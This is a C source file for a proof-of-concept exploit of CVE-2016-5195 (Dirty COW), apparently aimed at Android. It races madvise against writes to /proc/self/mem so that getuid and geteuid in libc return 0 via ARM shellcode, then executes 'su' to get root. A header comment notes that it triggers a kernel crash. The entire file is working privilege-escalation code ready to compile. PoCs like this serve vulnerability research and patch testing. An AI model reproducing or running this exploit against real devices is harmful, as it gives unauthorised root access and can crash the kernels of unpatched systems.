/*
 * CVE-2016-5195 dirtypoc
 *
 * This PoC is memory only and doesn't write anything on the filesystem.
 * /!\ Beware, it triggers a kernel crash a few minutes.
 *
 * gcc -Wall -o dirtycow-mem dirtycow-mem.c -ldl -lpthread
 */

#define _GNU_SOURCE
#include <err.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <pthread.h>
#include <stdbool.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/types.h>


#define SHELLCODE	"\x00\x00\xA0\xE3\x0E\xF0\xA0\xE1" // MOV R0, #0; MOV PC, R14;
#define SPACE_SIZE	256
#define LIBC_PATH	"/system/lib/libc.so"
#define LOOP		0x1000000

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

struct mem_arg  {
	struct stat st;
	off_t offset;
	unsigned int patch_addr;
	unsigned char *patch;
	unsigned char *check;
	size_t patch_size;
	void *map;
};


static int check(struct mem_arg * mem_arg)
{
	return memcmp(mem_arg->patch, mem_arg->check, mem_arg->patch_size) == 0;
}


static void *madviseThread(void *arg)
{
	struct mem_arg *mem_arg;
	size_t size;
	void *addr;

	mem_arg = (struct mem_arg *)arg;
	addr = (void *)(mem_arg->offset & (~(PAGE_SIZE - 1)));
	size = mem_arg->offset - (unsigned long)addr;

	for(int i = 0; i < LOOP; i++) {
		madvise(addr, size, MADV_DONTNEED);

		if (i % 0x1000 == 0 && check(mem_arg))
			break;
	}

	return NULL;
}

static void *procselfmemThread(void *arg)
{
	struct mem_arg *mem_arg;
	int fd;
	unsigned char *p;

	mem_arg = (struct mem_arg *)arg;
	p = mem_arg->patch;

	fd = open("/proc/self/mem", O_RDWR);
	if (fd == -1)
		err(1, "open(\"/proc/self/mem\"");

	for (int i = 0; i < LOOP; i++) {
		lseek(fd, mem_arg->offset, SEEK_SET);
		write(fd, p, mem_arg->patch_size);

		if (i % 0x1000 == 0 && check(mem_arg))
			break;
	}

	close(fd);

	return NULL;
}

static int get_range(unsigned int *start, unsigned int *end)
{
	char line[4096];
	char filename[PATH_MAX];
	char flags[32];
	FILE *fp;
	int ret;

	ret = -1;

	fp = fopen("/proc/self/maps", "r");
	if (fp == NULL)
		err(1, "fopen(\"/proc/self/maps\")");

	while (fgets(line, sizeof(line), fp) != NULL) {
		sscanf(line, "%x-%x %s %*x %*x:%*x %*Lu %s", start, end, flags, filename);

		if (strstr(flags, "r-xp") == NULL)
			continue;

		if (strstr(filename, "/libc.so") == NULL)
			continue;
		//printf("[%lx-%6lx][%s][%s]\n", start, end, flags, filename);
		ret = 0;
		break;
	}

	fclose(fp);

	return ret;
}

static void getroot(void)
{
	execlp("su", "su", NULL);
	err(1, "failed to execute \"su\"");
}

static void exploit(struct mem_arg *mem_arg)
{
	pthread_t pth1, pth2;

	pthread_create(&pth1, NULL, madviseThread, mem_arg);
	pthread_create(&pth2, NULL, procselfmemThread, mem_arg);

	pthread_join(pth1, NULL);
	pthread_join(pth2, NULL);
}

void * get_func_addr(char * func)
{
	void * addr;
	void * handle;
	char * error;

	dlerror();

	handle = dlopen("libc.so", RTLD_LAZY);
	if (handle == NULL) {
		fprintf(stderr, "%s\n", dlerror());
		exit(EXIT_FAILURE);
	}

	addr = dlsym(handle, func);
	error = dlerror();
	if (error != NULL) {
		fprintf(stderr, "%s\n", error);
		exit(EXIT_FAILURE);
	}

	dlclose(handle);

	return addr;
}

void patch_libc(char * func, char * offset, char * payload, size_t payload_len) {
	unsigned int start, end;
	void * func_addr;
	struct mem_arg mem_arg;
	struct stat st;
	pid_t pid;
	int fd;
	
	if (get_range(&start, &end) != 0)
		errx(1, "failed to get range");

	printf("[*] range: [%x-%x]\n", start, end);

	func_addr = get_func_addr(func);
	printf("[*] %s = %p\n", func, func_addr);

	mem_arg.patch = malloc(payload_len);
	if (mem_arg.patch == NULL)
		err(1, "malloc");

	mem_arg.check = func_addr;
	
	memcpy(mem_arg.patch, payload, payload_len);
	mem_arg.patch_size = payload_len;

	fd = open(LIBC_PATH, O_RDONLY);
	if (fd == -1)
		err(1, "open(\"" LIBC_PATH "\")");
	if (fstat(fd, &st) == -1)
		err(1, "fstat");

	mem_arg.map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
	if (mem_arg.map == MAP_FAILED)
		err(1, "mmap");
	close(fd);

	printf("[*] mmap %p\n", mem_arg.map);

	mem_arg.st = st;
	mem_arg.offset = (off_t)((unsigned int)mem_arg.map + func_addr - start);

	exploit(&mem_arg);
	
	printf("[*] patch complete\n\n");
}

int main(int argc, char *argv[])
{

	patch_libc("getuid", 0, SHELLCODE, sizeof(SHELLCODE)-1);
	patch_libc("geteuid", 0, SHELLCODE, sizeof(SHELLCODE)-1);

	printf("getuid() = %d\n", getuid());
	printf("geteuid() = %d\n", geteuid());
	
	getroot();

	return 0;
}
